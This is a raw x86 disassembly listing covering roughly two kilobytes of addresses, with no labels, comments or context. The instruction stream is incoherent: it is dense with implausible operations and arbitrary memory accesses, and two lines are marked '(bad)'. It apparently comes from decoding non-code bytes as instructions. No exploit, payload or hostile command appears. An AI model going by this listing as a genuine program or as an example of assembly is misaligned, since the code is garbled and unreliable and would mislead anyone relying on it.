  413e92:	add    BYTE PTR ds:0xc9a6409,al
  413e98:	lea    esi,[ecx]
  413e9a:	mov    al,ds:0x13082020
  413e9f:	bound  esp,QWORD PTR [eax]
  413ea1:	test   BYTE PTR ds:0x40040140,cl
  413ea7:	adc    BYTE PTR [eax],0xa2
  413eaa:	and    cl,BYTE PTR [esi]
  413eac:	push   esp
  413ead:	adc    BYTE PTR [edx],ah
  413eaf:	mov    bl,0x48
  413eb1:	inc    eax
  413eb2:	xor    al,0x84
  413eb4:	add    al,BYTE PTR [eax+0x20404d1]
  413eba:	adc    BYTE PTR [ecx-0x80],al
  413ebd:	or     cl,BYTE PTR [esp+eax*1+0x4a920408]
  413ec4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ec5:	xor    BYTE PTR [ecx],dl
  413ec7:	inc    edx
  413ec8:	ror    BYTE PTR [eax+edx*4+0x600eee61],0x0
  413ed0:	add    BYTE PTR [eax],cl
  413ed2:	add    BYTE PTR [ecx-0x37],cl
  413ed5:	sub    BYTE PTR [eax-0x5a],ah
  413ed8:	cwde   
  413ed9:	sub    BYTE PTR [ecx],ah
  413edb:	add    BYTE PTR [eax+0x11800882],dh
  413ee1:	mov    BYTE PTR [ecx+edx*1-0x1f57e7e8],al
  413ee8:	or     al,BYTE PTR [eax]
  413eea:	inc    eax
  413eeb:	jo     0x413f08
  413eed:	push   esp
  413eee:	push   esp
  413eef:	push   edx
  413ef0:	fs xchg esi,eax
  413ef2:	add    DWORD PTR [eax],eax
  413ef4:	add    al,0x10
  413ef6:	push   eax
  413ef7:	add    BYTE PTR [edx],cl
  413ef9:	xchg   edx,eax
  413efa:	push   eax
  413efb:	inc    ecx
  413efc:	inc    edx
  413efd:	cmp    bh,bh
  413eff:	adc    eax,0x42925c
  413f04:	test   esp,esp
  413f06:	inc    eax
  413f07:	and    BYTE PTR [edi+0x30],al
  413f0a:	or     DWORD PTR [ecx],eax
  413f0c:	add    eax,0xc0218448
  413f11:	rcl    BYTE PTR [edx],0x82
  413f14:	pusha  
  413f15:	adc    al,0xc
  413f17:	add    BYTE PTR [eax+0x510a88a1],dl
  413f1d:	adc    BYTE PTR [eax+0xac60001],al
  413f23:	and    BYTE PTR [eax+eax*4-0x7e993efb],dh
  413f2a:	add    DWORD PTR [edx],esp
  413f2c:	test   eax,0xa0b28940
  413f31:	add    BYTE PTR [eax],al
  413f33:	and    BYTE PTR [edx+0x2d],al
  413f36:	or     eax,0x10a000
  413f3b:	mov    es,WORD PTR [eax]
  413f3d:	add    DWORD PTR [edx],ecx
  413f3f:	rcl    BYTE PTR [eax],0xc5
  413f42:	sbb    cl,BYTE PTR [eax]
  413f44:	and    dl,ah
  413f46:	add    BYTE PTR [esi],bh
  413f48:	inc    ebx
  413f49:	test   DWORD PTR [eax],edi
  413f4b:	inc    eax
  413f4c:	dec    eax
  413f4d:	add    eax,0x802b10da
  413f52:	and    BYTE PTR [edx],al
  413f54:	mov    fs,eax
  413f56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f57:	mov    al,ds:0x27024000
  413f5c:	push   es
  413f5d:	and    DWORD PTR [edx+0x45],eax
  413f60:	inc    ecx
  413f61:	nop
  413f62:	xor    BYTE PTR [eax+0xc10005],al
  413f68:	sub    cl,dl
  413f6a:	inc    eax
  413f6b:	adc    al,BYTE PTR [eax-0x3ffc0000]
  413f71:	and    ah,BYTE PTR [eax]
  413f73:	add    BYTE PTR [eax+0x5449444c],dl
  413f79:	push   eax
  413f7a:	xchg   ecx,eax
  413f7b:	jne    0x413f80
  413f7d:	or     dl,BYTE PTR [edx]
  413f7f:	xor    al,0x11
  413f81:	xchg   BYTE PTR ds:0x401a18,al
  413f87:	cmp    eax,DWORD PTR [esi+0x6124c0c6]
  413f8d:	and    eax,0x9001180
  413f92:	add    DWORD PTR [eax],eax
  413f94:	cmp    BYTE PTR [edi],0x0
  413f97:	rol    BYTE PTR [eax-0x7fefff68],0x70
  413f9e:	or     BYTE PTR [esp+eax*4],cl
  413fa1:	and    BYTE PTR [eax],dh
  413fa3:	or     eax,0x24000200
  413fa8:	sbb    DWORD PTR [esi-0x70],esp
  413fab:	add    BYTE PTR [eax+0x404a1],al
  413fb1:	pusha  
  413fb2:	sub    al,0x40
  413fb4:	xor    ah,al
  413fb6:	cmp    bh,BYTE PTR [edx]
  413fb8:	or     BYTE PTR [eax],dh
  413fba:	add    BYTE PTR [eax],al
  413fbc:	mov    al,ds:0x250d0012
  413fc1:	push   es
  413fc2:	add    cl,al
  413fc4:	add    BYTE PTR [eax],cl
  413fc6:	push   eax
  413fc7:	sub    dl,BYTE PTR [ecx]
  413fc9:	fsub   DWORD PTR [esi]
  413fcb:	adc    BYTE PTR [eax],al
  413fcd:	fstp   QWORD PTR [eax]
  413fcf:	add    BYTE PTR [ecx],al
  413fd1:	add    BYTE PTR [esp+edx*1],ah
  413fd4:	add    BYTE PTR [eax+eax*4],al
  413fd7:	adc    BYTE PTR [eax],dl
  413fd9:	adc    BYTE PTR [edx-0x5fecffff],al
  413fdf:	(bad)  
  413fe0:	test   al,0x48
  413fe2:	inc    eax
  413fe3:	push   ss
  413fe4:	and    eax,0x400049a1
  413fe9:	adc    al,0x8
  413feb:	inc    esi
  413fec:	mov    edx,0x81204080
  413ff1:	adc    edx,DWORD PTR [ecx]
  413ff3:	dec    eax
  413ff4:	adc    BYTE PTR [ecx+0xf],ah
  413ff7:	and    al,BYTE PTR [eax+0x2341643]
  413ffd:	add    dl,BYTE PTR [eax+0x0]
  414000:	or     DWORD PTR [esi+eax*8],edx
  414003:	pusha  
  414004:	add    DWORD PTR [ecx+ecx*2+0x10824012],esp
  41400b:	add    DWORD PTR [eax+0x0],ecx
  41400e:	inc    eax
  41400f:	nop
  414010:	add    al,0x60
  414012:	add    BYTE PTR [eax-0x37ec5dba],al
  414018:	mov    eax,0x101fe002
  41401d:	pusha  
  41401e:	add    DWORD PTR [eax+0x14],edx
  414021:	sbb    BYTE PTR [ecx+eax*1-0x55],al
  414025:	add    BYTE PTR [ebx],bl
  414027:	pusha  
  414028:	sbb    BYTE PTR [esi+eiz*1],bl
  41402b:	xchg   esp,eax
  41402c:	and    BYTE PTR [eax],dl
  41402e:	adc    DWORD PTR [eax],esi
  414030:	add    BYTE PTR [eax],dh
  414032:	pusha  
  414033:	sub    BYTE PTR [eax+0x8290092],ch
  414039:	add    DWORD PTR [ecx],esp
  41403b:	add    ah,BYTE PTR [eax]
  41403d:	rol    BYTE PTR [esp+esi*1],0x20
  414041:	add    BYTE PTR [eax],ah
  414043:	add    BYTE PTR [eax+0x4],dl
  414046:	inc    edx
  414047:	add    BYTE PTR [eax],al
  414049:	mov    al,0x4
  41404b:	or     BYTE PTR [eax],0x8
  41404e:	or     ch,al
  414050:	add    BYTE PTR [esi+0x8145],0x1
  414057:	sub    BYTE PTR es:[edx],ah
  41405a:	add    BYTE PTR [ebx],al
  41405c:	loope  0x41405f
  41405e:	sbb    BYTE PTR [edx+0x11913c29],al
  414064:	adc    DWORD PTR [esi-0x40],0x40030806
  41406b:	push   eax
  41406c:	adc    BYTE PTR [eax],al
  41406e:	adc    al,BYTE PTR [eax+0x12]
  414071:	or     BYTE PTR [ecx+0x44],0x81
  414075:	mov    al,al
  414077:	adc    DWORD PTR [edx],ecx
  414079:	add    DWORD PTR [ecx],eax
  41407b:	addr16 sub al,0x1
  41407e:	inc    esp
  41407f:	add    BYTE PTR [esi],al
  414081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414082:	inc    eax
  414083:	or     DWORD PTR [eax],ecx
  414085:	cmp    BYTE PTR [ecx+0x940008],0x8
  41408c:	jo     0x41400f
  41408e:	ror    BYTE PTR [edx+0x30],0x60
  414092:	adc    BYTE PTR [ecx],dh
  414094:	inc    esp
  414095:	add    BYTE PTR [eax+0x2490a109],al
  41409b:	push   ecx
  41409c:	add    BYTE PTR [edx-0x60],cl
  41409f:	sub    dl,BYTE PTR [edi+0x12]
  4140a2:	inc    eax
  4140a3:	inc    ecx
  4140a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140a5:	or     BYTE PTR [eax],al
  4140a7:	pusha  
  4140a8:	adc    DWORD PTR [eax],eax
  4140aa:	sbb    DWORD PTR [ecx],esi
  4140ac:	add    DWORD PTR [eax+0x400209a],eax
  4140b2:	adc    al,0x0
  4140b4:	add    ecx,ecx
  4140b6:	add    eax,0x43061202
  4140bb:	inc    eax
  4140bc:	and    al,0xb0
  4140bf:	adc    DWORD PTR [ecx],esp
  4140c1:	sub    BYTE PTR [eax],al
  4140c3:	add    BYTE PTR [eax],al
  4140c5:	mov    dl,BYTE PTR [ebx+edx*1+0x10]
  4140c9:	inc    edx
  4140ca:	popf   
  4140cb:	add    DWORD PTR [eax],ebp
  4140cd:	add    BYTE PTR [eax+0x0],0x66
  4140d1:	dec    eax
  4140d2:	push   es
  4140d3:	mov    al,ds:0x10c00020
  4140d8:	add    BYTE PTR ds:0xda1c1008,0x1
  4140df:	adc    BYTE PTR [ecx-0x65f5bbe0],al
  4140e5:	add    BYTE PTR [eax],0x38
  4140e8:	add    BYTE PTR [ecx],al
  4140ea:	and    BYTE PTR [ecx+0x108884c9],cl
  4140f0:	add    BYTE PTR [eax],0x0
  4140f3:	mov    al,ds:0x29060348
  4140f8:	sbb    ah,BYTE PTR [eax+0x74]
  4140fb:	xor    eax,0x2b050504
  414100:	cli    
  414101:	add    edi,DWORD PTR [eax]
  414103:	inc    ecx
  414104:	inc    ecx
  414105:	add    BYTE PTR [ecx-0x7fdcffc8],ch
  41410b:	nop
  41410c:	xchg   ecx,eax
  41410d:	add    DWORD PTR [ebx+0x8128040],edx
  414113:	adc    DWORD PTR [eax+0x26],eax
  414116:	ret    0x200
  414119:	loopne 0x414164
  41411b:	shl    BYTE PTR [eax-0x7ffdc9f8],0x24
  414122:	add    eax,DWORD PTR [edx]
  414124:	test   BYTE PTR [ecx],cl
  414126:	adc    ch,al
  414128:	add    ah,BYTE PTR [eax]
  41412a:	pusha  
  41412b:	xor    BYTE PTR [eax],ah
  41412d:	mov    BYTE PTR [edx],al
  41412f:	add    BYTE PTR [edx+0x0],al
  414132:	pusha  
  414133:	add    DWORD PTR [eax+0x28],eax
  414136:	(bad)  
  414137:	call   0x98211bc
  41413c:	pusha  
  41413d:	inc    eax
  41413e:	add    al,BYTE PTR [edx]
  414140:	add    DWORD PTR [ebp+0x40a24402],0xc2376008
  41414a:	and    eax,DWORD PTR ds:0x8c248324
  414150:	dec    eax
  414151:	and    eax,DWORD PTR [edx+eax*1-0x5ee6fbdc]
  414158:	adc    BYTE PTR [ecx],al
  41415a:	sbb    DWORD PTR [ecx],esi
  41415c:	dec    ebx
  41415d:	or     ch,BYTE PTR [edx]
  41415f:	add    al,cl
  414161:	mov    al,ds:0x5200290e
  414166:	test   BYTE PTR [eax],al
  414168:	add    ah,BYTE PTR [ebx]
  41416a:	inc    eax
  41416b:	or     BYTE PTR [ecx],cl
  41416d:	add    al,BYTE PTR [eax+0x44]
  414170:	push   eax
  414171:	mov    eax,ds:0x1381620
  414176:	sub    BYTE PTR [ecx],cl
  414178:	push   ax
  41417a:	push   ecx
  41417b:	popa   
  41417c:	add    eax,DWORD PTR [edx]
  41417e:	aam    0x0
  414180:	jo     0x4141a2
  414182:	adc    BYTE PTR [eax+0x14],0xc8
  414186:	rol    BYTE PTR [eax],0xf3
  414189:	cwde   
  41418a:	sbb    al,BYTE PTR [eax+0x1]
  41418d:	and    al,0x48
  41418f:	jno    0x414155
  414191:	sbb    BYTE PTR [ecx],bl
  414193:	mov    eax,0x5a00
  414198:	inc    esi
  414199:	add    BYTE PTR [eax-0x7ffff8ae],cl
  41419f:	call   0x682:0x60280915
  4141a6:	mov    BYTE PTR [eax],al
  4141a8:	and    DWORD PTR ds:0x918a1a1,eax
  4141ae:	mov    WORD PTR [eax+ecx*1],ds
  4141b1:	mov    BYTE PTR [eax],dl
  4141b3:	mov    eax,ds:0xa188a402
  4141b8:	mov    al,0x20
  4141ba:	adc    BYTE PTR [eax+0x45],0x86
  4141be:	add    al,0x40
  4141c0:	or     eax,0x14160100
  4141c5:	mov    al,ds:0x44302460
  4141ca:	or     al,0x3
  4141cc:	and    al,0xa
  4141ce:	add    al,BYTE PTR [ebx]
  4141d0:	adc    BYTE PTR [esi],al
  4141d2:	sub    BYTE PTR [ecx+0x61],cl
  4141d5:	sub    DWORD PTR [eax+0x2bc90099],0x820c8008
  4141df:	adc    cl,BYTE PTR [eax]
  4141e1:	add    eax,0x20624b08
  4141e6:	adc    DWORD PTR [ecx],eax
  4141e8:	adc    BYTE PTR [ecx+0x7],dl
  4141eb:	mov    al,0x29
  4141ed:	pop    esp
  4141ee:	adc    BYTE PTR [edx+0x0],al
  4141f1:	add    BYTE PTR [eax],al
  4141f3:	add    BYTE PTR [ebx+0x52],dh
  4141f6:	add    BYTE PTR [eax+eiz*1+0x1045b0c],dl
  4141fd:	adc    BYTE PTR [edx],cl
  4141ff:	or     DWORD PTR [edx+0xcec404],esp
  414205:	xor    BYTE PTR [eax],dl
  414207:	stos   BYTE PTR es:[edi],al
  414208:	add    DWORD PTR [eax+eax*1+0x300006d0],0xf2008813
  414213:	add    BYTE PTR [ebx-0x41],dl
  414216:	mov    al,ds:0x60083010
  41421b:	popa   
  41421c:	add    al,0x0
  41421e:	mov    al,0x44
  414220:	xchg   esp,eax
  414221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414222:	or     DWORD PTR [eax],ebx
  414224:	add    DWORD PTR [edx-0x6b7edfdc],ecx
  41422a:	and    BYTE PTR [eax],cl
  41422c:	test   BYTE PTR [eax],bl
  41422e:	add    BYTE PTR [edx-0x55d1b7f6],ah
  414234:	inc    eax
  414235:	add    BYTE PTR [eax],al
  414237:	dec    ecx
  414238:	and    BYTE PTR [eax+0x30],dh
  41423b:	and    al,BYTE PTR [eax]
  41423d:	pusha  
  41423e:	loopne 0x414280
  414240:	inc    esp
  414241:	or     al,0x34
  414244:	dec    esp
  414245:	adc    eax,0xe00a5105
  41424a:	push   0x6866382b
  41424f:	sub    BYTE PTR [ebx],dl
  414251:	xor    BYTE PTR [esp+eax*4],cl
  414254:	add    BYTE PTR [edi+0x4089b42],cl
  41425a:	add    BYTE PTR [ecx],0x1
  41425d:	sub    BYTE PTR [edx],al
  41425f:	or     esi,DWORD PTR [eax-0x7f]
  414262:	and    BYTE PTR [eax],cl
  414264:	add    BYTE PTR [eax-0x7fdbbefc],ch
  41426a:	sbb    BYTE PTR [eax],cl
  41426c:	add    BYTE PTR [eax],bl
  41426e:	and    BYTE PTR [edx-0x5c],dl
  414271:	and    eax,0x40215240
  414276:	xchg   esp,eax
  414277:	popa   
  414278:	add    BYTE PTR [eax],al
  41427a:	add    BYTE PTR [edx-0x30],ah
  41427d:	push   esp
  41427e:	add    DWORD PTR [eax],esp
  414280:	xchg   ebp,eax
  414281:	add    BYTE PTR [eax+0x14018242],cl
  414287:	push   eax
  414288:	or     BYTE PTR [eax],al
  41428a:	add    eax,0xc0451ac2
  41428f:	int3   
  414290:	add    DWORD PTR [eax],eax
  414292:	add    BYTE PTR [ecx-0x80],dl
  414295:	and    al,0x11
  414297:	inc    esp
  414298:	add    al,0xe1
  41429a:	push   edx
  41429b:	inc    edx
  41429c:	mov    ss,WORD PTR [eax]
  41429e:	add    BYTE PTR [eax],dl
  4142a0:	and    BYTE PTR [eax-0x80],al
  4142a3:	adc    BYTE PTR [ecx],al
  4142a5:	adc    BYTE PTR [ecx],dl
  4142a7:	push   eax
  4142a8:	adc    al,BYTE PTR [eax+0x7810c808]
  4142ae:	xor    BYTE PTR [eax-0x7ffb6680],ah
  4142b4:	and    BYTE PTR [eax],al
  4142b6:	adc    al,BYTE PTR [eax]
  4142b8:	dec    eax
  4142b9:	adc    dl,ah
  4142bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142bc:	dec    eax
  4142bd:	adc    DWORD PTR [ecx+0xa0ed801],edi
  4142c3:	adc    BYTE PTR [ecx+0x0],al
  4142c6:	add    BYTE PTR [ecx],bl
  4142c8:	and    BYTE PTR [edx],ch
  4142ca:	sbb    bl,al
  4142cc:	or     BYTE PTR [eax],al
  4142ce:	and    DWORD PTR [eax],eax
  4142d0:	add    DWORD PTR [ecx+eax*2+0xc],eax
  4142d4:	xor    BYTE PTR [esp+eax*1+0x48],0xc0
  4142d9:	sbb    cl,BYTE PTR [eax]
  4142db:	adc    DWORD PTR [ecx],ebx
  4142dd:	and    al,0x0
  4142df:	inc    eax
  4142e0:	sub    BYTE PTR [eax],al
  4142e2:	add    al,0xe0
  4142e4:	inc    eax
  4142e5:	gs pop edi
  4142e7:	dec    eax
  4142e8:	or     cl,al
  4142ea:	and    BYTE PTR [edi+ecx*1],dl
  4142ed:	push   eax
  4142ee:	test   BYTE PTR [eax+0x84002],ah
  4142f4:	cs nop
  4142f6:	sub    al,ah
  4142f8:	adc    BYTE PTR ds:0x40991005,al
  4142fe:	and    al,BYTE PTR [eax]
  414300:	add    DWORD PTR [edx+eax*2+0xcc01482],eax
  414307:	mov    dl,0x39
  414309:	inc    eax
  41430a:	pop    ecx
  41430b:	popa   
  41430c:	add    esi,DWORD PTR [eax]
  41430e:	dec    eax
  41430f:	out    0x4,al
  414311:	xchg   esi,eax
  414312:	mov    al,ds:0x109349e8
  414317:	adc    BYTE PTR [edx],al
  414319:	inc    esp
  41431a:	imul   eax,DWORD PTR [esi],0x88200881
  414320:	mov    ah,0x0
  414322:	and    BYTE PTR [ecx],al
  414324:	jno    0x41432e
  414326:	adc    al,0xa0
  414328:	mov    WORD PTR [eax],es
  41432a:	add    BYTE PTR [eax],ah
  41432c:	mov    BYTE PTR [eax],cl
  41432e:	and    cl,BYTE PTR [esi]
  414330:	or     BYTE PTR [esi+0x100051c0],0x1
  414337:	add    al,0x86
  414339:	add    DWORD PTR [eax],ecx
  41433b:	sub    BYTE PTR [eax],al
  41433d:	add    cl,BYTE PTR [ecx]
  41433f:	push   ds
  414340:	add    DWORD PTR [edx],eax
  414342:	sbb    DWORD PTR [ebx],esi
  414344:	add    BYTE PTR [eax],ah
  414346:	sbb    al,0xb
  414348:	sbb    BYTE PTR [eax+ebx*1],ah
  41434b:	sub    BYTE PTR es:[edx],ah
  41434e:	add    DWORD PTR [edx+0x1000200],esp
  414354:	dec    eax
  414355:	add    eax,0x68ad051
  41435a:	dec    ebx
  41435b:	inc    ebx
  41435c:	adc    BYTE PTR [eax],cl
  41435e:	and    eax,edx
  414360:	add    BYTE PTR [eax],al
  414362:	inc    edx
  414363:	inc    ecx
  414364:	inc    eax
  414365:	or     DWORD PTR [esi],eax
  414367:	mov    al,ds:0x21010841
  41436c:	or     eax,0x144c404
  414371:	inc    esp
  414372:	adc    DWORD PTR [eax],eax
  414374:	add    DWORD PTR [ecx],edx
  414376:	inc    ecx
  414377:	add    BYTE PTR [edx-0x7fdfe340],0xc4
  41437e:	and    BYTE PTR [ecx+0x1061e620],ch
  414384:	inc    ecx
  414385:	ret    0x3a80
  414388:	and    al,0x82
  41438a:	inc    eax
  41438b:	add    DWORD PTR [edx+ecx*1],edx
  41438e:	pushf  
  41438f:	mov    ecx,0x321081
  414394:	test   DWORD PTR [eax],eax
  414396:	add    BYTE PTR [edx-0x77fdbf7f],0x88
  41439d:	test   al,0x28
  41439f:	test   DWORD PTR [edx],eax
  4143a1:	inc    eax
  4143a2:	shl    BYTE PTR [ecx],0x2
  4143a5:	pop    eax
  4143a6:	sub    BYTE PTR [eax],dl
  4143a8:	push   cs
  4143a9:	and    BYTE PTR [edx],al
  4143ab:	and    DWORD PTR [esi],eax
  4143ad:	or     DWORD PTR [ecx+0x1c24a8],esi
  4143b3:	or     al,0x40
  4143b5:	add    al,BYTE PTR [eax]
  4143b7:	mov    al,ds:0x5a824a4c
  4143bc:	enter  0x1a33,0x1
  4143c0:	add    al,0x30
  4143c2:	or     DWORD PTR [ecx],ecx
  4143c4:	add    DWORD PTR [eax-0x7e],0x21022a0
  4143cb:	add    BYTE PTR [edx],dl
  4143cd:	add    BYTE PTR [ebx+0x20180e45],al
  4143d3:	loopne 0x414397
  4143d5:	nop
  4143d6:	sub    DWORD PTR [eax],ecx
  4143d8:	add    al,0x2
  4143da:	xor    BYTE PTR [ecx+0x7a544142],cl
  4143e0:	mov    al,ds:0x38040140
  4143e5:	add    DWORD PTR [ecx+0x30e00a],0x74120200
  4143ef:	rcl    DWORD PTR [edx+edx*1],0xc0
  4143f3:	and    al,0x8
  4143f5:	adc    BYTE PTR [eax+eax*1+0x455a8e1],bl
  4143fc:	add    cl,BYTE PTR [eax+0x44]
  4143ff:	nop
  414400:	add    BYTE PTR [edi],dl
  414402:	adc    al,BYTE PTR [esi]
  414404:	adc    DWORD PTR [ecx+0x28488c28],eax
  41440a:	add    BYTE PTR [eax],0x80
  41440d:	mov    eax,0x28e90660
  414412:	add    ecx,DWORD PTR [ebx+0x2009282]
  414418:	and    BYTE PTR [eax],ah
  41441a:	adc    BYTE PTR [eax-0x77],bl
  41441d:	inc    eax
  41441e:	push   eax
  41441f:	adc    al,0x33
  414421:	and    dh,0x5
  414424:	add    ah,BYTE PTR [eax+0x2d]
  414427:	and    bh,BYTE PTR [eax-0x5ceb6fde]
  41442d:	adc    al,BYTE PTR [ebx]
  41442f:	and    BYTE PTR [eax],al
  414431:	add    BYTE PTR [edx],dl
  414433:	adc    DWORD PTR [eax],edx
  414435:	fs add eax,ecx
  414438:	xchg   BYTE PTR [eax+0x2329228],dl
  41443e:	and    eax,0x900100d8
  414443:	add    BYTE PTR [eax],0x32
  414446:	sbb    BYTE PTR [edx+ecx*2-0x7c],bl
  41444a:	sub    al,0x60
  41444c:	inc    edx
  41444d:	push   edx
  41444e:	xchg   esi,eax
  41444f:	push   es
  414450:	add    ah,BYTE PTR [eax]
  414452:	adc    al,BYTE PTR [eax]
  414454:	or     BYTE PTR [ecx+0x40441852],cl
  41445a:	les    eax,FWORD PTR [edx]
  41445c:	add    BYTE PTR [eax+edx*2],dl
  41445f:	aam    0x28
  414461:	jecxz  0x4144cb
  414463:	xor    BYTE PTR [eax+0x2080ba08],0x35
  41446a:	dec    ecx
  41446b:	pop    ss
  41446c:	add    al,0x48
  41446e:	and    BYTE PTR [eax+ecx*1+0x2a89846],0x40
  414476:	add    BYTE PTR [eax+0x190000d0],cl
  41447c:	add    al,BYTE PTR [eax]
  41447e:	inc    eax
  41447f:	add    BYTE PTR [eax+0x20],al
  414482:	or     DWORD PTR [esi+eiz*1],edx
  414485:	add    al,0x5
  414487:	or     dl,BYTE PTR [ecx+0x8258209]
  41448d:	and    BYTE PTR ds:0xa4014009,al
  414493:	add    al,0x8
  414495:	cs push edx
  414497:	test   DWORD PTR [eax+0x20],esp
  41449a:	inc    eax
  41449b:	mov    eax,es
  41449d:	add    BYTE PTR [ebx],al
  41449f:	add    BYTE PTR [eax+0x62],dl
  4144a2:	add    BYTE PTR [eax],al
  4144a4:	and    BYTE PTR [edx],al
  4144a6:	xor    al,0xa2
  4144a8:	add    BYTE PTR [ebp+ecx*2+0x803080],al
  4144af:	add    BYTE PTR [edx],bl
  4144b1:	add    BYTE PTR [eax-0x3fffe7fc],ah
  4144b7:	cmp    BYTE PTR [ecx],ah
  4144b9:	or     al,0x0
  4144bb:	add    eax,eax
  4144bd:	add    eax,DWORD PTR [eax+0x1120a7]
  4144c3:	add    DWORD PTR [eax+0x6a224],eax
  4144c9:	push   esp
  4144ca:	js     0x4144cc
  4144cc:	test   BYTE PTR [edx],cl
  4144ce:	add    DWORD PTR [eax],ecx
  4144d0:	call   0x2090:0x363c8182
  4144d7:	add    DWORD PTR [eax+0x1],0x20543040
  4144de:	and    al,BYTE PTR [eax+eax*4]
  4144e1:	or     BYTE PTR [ecx+ebp*2],bl
  4144e4:	mov    al,ds:0x153051c0
  4144e9:	or     BYTE PTR [eax+0x2010a00],al
  4144ef:	daa    
  4144f0:	pusha  
  4144f1:	add    esp,DWORD PTR [eax]
  4144f3:	sub    dh,ah
  4144f5:	adc    dl,BYTE PTR [eax]
  4144f7:	adc    DWORD PTR [edx],eax
  4144f9:	push   0x12b1e090
  4144fe:	add    BYTE PTR [esp+eax*8],0x12
  414502:	push   eax
  414503:	add    DWORD PTR [ebx],eax
  414505:	xor    al,0x16
  414507:	push   ss
  414508:	and    eax,0x186404b0
  41450d:	add    DWORD PTR [ebx],eax
  41450f:	and    al,0x40
  414511:	add    al,0xc0
  414513:	inc    eax
  414514:	inc    edx
  414515:	or     DWORD PTR [eax+ecx*1],ebx
  414518:	ror    al,0x53
  41451b:	adc    al,0x34
  41451d:	shl    BYTE PTR ds:0x210520,1
  414523:	add    al,0x80
  414525:	add    BYTE PTR [edx],cl
  414527:	sub    BYTE PTR [eax],ah
  414529:	mov    BYTE PTR [esp+esi*1],al
  41452c:	mov    eax,ds:0x120080b0
  414531:	and    cl,BYTE PTR [ecx+eiz*4]
  414534:	clc    
  414535:	add    eax,0x49a4108
  41453a:	add    BYTE PTR [edx+0x12002048],dl
  414540:	add    BYTE PTR [edx],al
  414542:	add    eax,DWORD PTR [eax]
  414544:	mov    al,ds:0x80168a00
  414549:	rcl    BYTE PTR [edx+eiz*1],0x20
  41454d:	ret    0x8a2
  414550:	add    dl,0x44
  414553:	xor    DWORD PTR [ecx+0x2],0x68012
  41455a:	jb     0x41458d
  41455c:	add    cl,al
  41455e:	aam    0xe1
  414560:	add    BYTE PTR [eax],0x5
  414563:	xor    BYTE PTR [eax],dl
  414565:	dec    eax
  414566:	adc    al,BYTE PTR [ebx+0x61]
  414569:	add    BYTE PTR [eax],dl
  41456b:	push   ss
  41456c:	inc    ebp
  41456d:	adc    al,0xc0
  41456f:	sub    eax,0x5402002
  414574:	bound  esp,QWORD PTR [eax]
  414576:	xor    DWORD PTR [bx+di],esp
  414579:	or     edx,DWORD PTR [ebx]
  41457b:	or     al,ah
  41457d:	add    eax,eax
  41457f:	xor    al,0x0
  414581:	sub    BYTE PTR [esi],al
  414583:	inc    ecx
  414584:	adc    al,BYTE PTR [eax+0x9]
  414587:	push   esp
  414588:	and    al,0x8
  41458a:	add    DWORD PTR fs:[ecx+ebx*1-0x7aeff9fb],eax
  414592:	push   0x383018
  414597:	or     ch,BYTE PTR [ecx]
  414599:	inc    eax
  41459a:	add    BYTE PTR [eax],ah
  41459c:	inc    ebp
  41459d:	adc    BYTE PTR [eax+0x10542802],al
  4145a3:	add    BYTE PTR [esi],al
  4145a5:	or     DWORD PTR [ecx+0x40181649],eax
  4145ab:	adc    BYTE PTR [esi+eiz*4],ah
  4145ae:	mov    al,ds:0x604201d
  4145b3:	add    al,0x52
  4145b5:	sbb    BYTE PTR [eax],dl
  4145b7:	inc    esi
  4145b8:	add    al,BYTE PTR [eax]
  4145ba:	add    bl,BYTE PTR [eax+0x10802410]
  4145c0:	xor    edx,DWORD PTR [ecx]
  4145c2:	or     ah,BYTE PTR [ecx+0x44]
  4145c5:	add    ch,BYTE PTR [edi]
  4145c7:	mov    BYTE PTR [eax],ch
  4145c9:	inc    esp
  4145ca:	add    DWORD PTR [eax+0x0],0x230c33
  4145d1:	adc    DWORD PTR [eax],eax
  4145d3:	xor    BYTE PTR [ecx],al
  4145d5:	add    ah,BYTE PTR [esi+0x9]
  4145d8:	sub    DWORD PTR [edx+0x57610218],eax
  4145de:	xchg   edx,eax
  4145df:	inc    ecx
  4145e0:	nop
  4145e1:	adc    ch,BYTE PTR [eax+0x4000424]
  4145e7:	or     DWORD PTR [eax+eax*1],0x8300280
  4145ee:	rol    BYTE PTR [eax],0x48
  4145f1:	add    al,0x62
  4145f3:	mov    BYTE PTR [ecx],al
  4145f5:	mov    al,0x80
  4145f7:	add    BYTE PTR [edx],0x92
  4145fa:	mov    BYTE PTR [ecx+0x419e0042],al
  414600:	sbb    BYTE PTR [ebx],ah
  414602:	adc    BYTE PTR [ecx+ebx*2],ch
  414605:	xor    eax,0x10320011
  41460a:	dec    esi
  41460b:	or     DWORD PTR [esi+eax*1],ecx
  41460e:	sbb    al,0xe0
  414610:	mov    al,ds:0xb29b0461
  414615:	enter  0x1d89,0x81
  414619:	sub    eax,ebp
  41461b:	xor    dh,BYTE PTR [ecx-0x7dff7ef0]
  414621:	adc    BYTE PTR [ecx],ah
  414623:	adc    cl,BYTE PTR [eax+0x2]
  414626:	bound  edx,QWORD PTR [eax+0x0]
  414629:	or     BYTE PTR [ecx+0x1],al
  41462c:	inc    ecx
  41462d:	and    BYTE PTR [eax],dh
  41462f:	adc    BYTE PTR [eax],al
  414631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414632:	test   al,0xb
  414634:	or     BYTE PTR [esi],al
  414636:	or     al,0x66
  414638:	add    BYTE PTR [ecx-0x78],ch
  41463b:	inc    eax
  41463c:	or     al,0x8
  41463e:	pop    edx
  41463f:	add    al,BYTE PTR [eax]
  414641:	and    al,0xc2
  414643:	inc    edx
  414644:	or     BYTE PTR [esi],dh
  414646:	shl    BYTE PTR [eax+0x10],0x9
  41464a:	adc    BYTE PTR [esi+eax*1],al
  41464d:	rcr    BYTE PTR [eax-0x77],1
  414650:	dec    edx
  414651:	or     BYTE PTR [eax+0x31842722],cl
  414657:	adc    BYTE PTR [edx],dl
  414659:	xor    al,0x40
  41465b:	and    DWORD PTR [eax],eax
  41465d:	xor    DWORD PTR [edi],edi
  41465f:	add    eax,DWORD PTR [eax]
  414661:	add    BYTE PTR [edi],al
  414663:	and    DWORD PTR [eax],ecx
  414665:	test   DWORD PTR [ecx-0x7eff87ff],eax
  41466b:	add    BYTE PTR [ecx],0x40
  41466e:	sub    al,BYTE PTR [eax+0x505801a0]
